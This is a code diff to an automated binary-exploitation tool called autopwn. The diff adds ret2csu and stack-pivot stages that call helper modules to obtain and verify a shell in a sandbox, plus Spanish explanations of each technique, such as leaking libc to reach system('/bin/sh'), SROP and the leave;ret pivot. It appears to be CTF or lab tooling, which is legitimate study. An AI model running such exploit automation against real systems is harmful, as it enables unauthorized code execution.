@@ -150,6 +150,42 @@ def autopwn(binary: str, config=None, store=None,
         except Exception as e:
             res.attempts.append(("srop", False, str(e)))
 
+    # combo A3: ret2csu -- gadget-poor binaries that still have the two universal
+    # __libc_csu_init-style gadgets (sets rdi/rsi/rdx and makes an indirect call WITHOUT any
+    # pop rsi/pop rdx of their own). Tried before the generic ROP sweep below, which would never
+    # find this path (no pop rsi/pop rdx to find).
+    if want("ret2csu") and not res.win_exploit:
+        try:
+            from .autocsu import autocsu, _csu_applicable
+            if _csu_applicable(binary):
+                log("[combo] ret2csu: gadgets universales de __libc_csu_init (sandbox)...")
+                rcu = autocsu(binary)
+                verdict = True if rcu.get("verified") else (None if rcu.get("ok") else False)
+                res.attempts.append(("ret2csu", verdict, rcu.get("detail") or rcu.get("note", "")))
+                res.win_exploit = res.win_exploit or bool(rcu.get("verified"))
+                log(f"[combo] ret2csu -> {'SHELL VERIFICADA' if rcu.get('verified') else 'no verificado'}")
+                learn(f"ret2csu verified={rcu.get('verified')} {rcu.get('detail','')}")
+        except Exception as e:
+            res.attempts.append(("ret2csu", False, str(e)))
+
+    # combo A4: stack pivot -- the overflow is too SHORT for a full chain (only reaches saved
+    # rbp/rip), so it migrates RSP into a larger, already-staged buffer via `leave; ret`. Only
+    # worth trying when there IS a gift function but the direct/ROP paths above didn't verify
+    # (a short overflow is exactly the shape that makes them fail).
+    if want("pivot") and not res.win_exploit:
+        try:
+            from .autopivot import autopivot, _pivot_applicable
+            if _pivot_applicable(binary):
+                log("[combo] stack pivot: overflow corto -> migracion RSP a buffer .bss (sandbox)...")
+                rpv = autopivot(binary)
+                verdict = True if rpv.get("verified") else (None if rpv.get("ok") else False)
+                res.attempts.append(("pivot", verdict, rpv.get("detail") or rpv.get("note", "")))
+                res.win_exploit = res.win_exploit or bool(rpv.get("verified"))
+                log(f"[combo] stack pivot -> {'SHELL VERIFICADA' if rpv.get('verified') else 'no verificado'}")
+                learn(f"pivot verified={rpv.get('verified')} {rpv.get('detail','')}")
+        except Exception as e:
+            res.attempts.append(("pivot", False, str(e)))
+
     # combo B: ROP chain (ret2libc / execve). On a PIE binary the base must be resolved first, so
     # use the PIE-aware ROP verifier; otherwise the static/no-PIE ROP builder (with string staging
     # + SROP). Both verify by getting a real shell in the sandbox. Skipped once we already have a
@@ -394,6 +430,10 @@ def _why(mit: dict, has_win: bool, technique: str) -> str:
         return "sin win(): fuga de libc (puts@GOT) -> base -> system('/bin/sh')"
     if "srop" in t:            # antes de 'rop' (substring): SROP es una tecnica distinta
         return "binario pobre en gadgets con gadget syscall + '/bin/sh' -> SROP: un rt_sigreturn restaura TODOS los registros desde un frame forjado y ejecuta execve('/bin/sh')"
+    if "csu" in t:             # antes de 'rop' (substring): ret2csu es distinto del ROP generico
+        return "sin pop rsi/pop rdx propios -> los dos gadgets universales de __libc_csu_init fijan rdi/rsi/rdx y hacen una llamada indirecta"
+    if "pivot" in t:
+        return "overflow demasiado corto para una cadena completa (solo alcanza saved rbp/rip) -> `leave; ret` migra RSP a un buffer .bss ya escalonado con la cadena real"
     if "rop" in t:
         return ("sin win()/system directo -> cadena ROP execve por syscall"
                 + (" (PIE: base resuelta en sandbox)" if pie else ""))
